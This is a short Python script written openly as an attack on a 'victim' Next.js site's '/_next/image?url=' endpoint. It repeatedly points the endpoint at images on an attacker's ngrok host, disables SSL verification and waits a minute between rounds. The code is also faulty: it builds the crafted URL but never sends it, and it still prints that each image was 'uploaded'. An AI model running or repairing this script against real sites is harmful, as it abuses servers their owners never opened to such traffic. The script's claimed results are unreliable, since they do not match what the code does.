import shutil
import os
import requests
from urllib.parse import quote
import time  #Import the time module

source_image = "chillguy.jpg"  #Image file
attacker_url_base = "your_ngrok_url" #your ngrok url
upload_endpoint = "https://victim_url.com"  #victim url

def copy_and_upload_image(file_name, num_copies):
    if not os.path.exists(source_image):
        print(f"File {source_image} not found")
        return

    for i in range(1, num_copies + 1):
        new_image_name = f"chillguy{i}.jpg"#change the name of image file too if you change at line 7 before

        # image file increment
        shutil.copy(source_image, new_image_name)
        print(f"Copy of: {new_image_name}")

        # URL combination
        image_url = f"{upload_endpoint}/_next/image?url={attacker_url_base}/{new_image_name}&w=256&q=100"

        # Deactive SSL verification
        try:
            response = requests.get(upload_endpoint, verify=False)
            if response.status_code == 200:
                print(f"Image {new_image_name} uploaded to {upload_endpoint}, url: {image_url}")
            else:
                print(f"Failed to upload {new_image_name}. Status: {response.status_code}, Response: {response.text}")
        except Exception as e:
            print(f"Error {new_image_name}: {e}")

     	 # 1 minute delay
        print(f"Wait a minute... {new_image_name}...")
        time.sleep(60) 

        # delete copy of image file on your local system
        os.remove(new_image_name)
        print(f"Delete: {new_image_name}")

#input
try:
    num_copies = int(input("Enter how many copies of your image: "))
    copy_and_upload_image("chillguy.jpg", num_copies)#change the name of image file too if you change at line 7 before
except ValueError:
    print("Please input number only.")
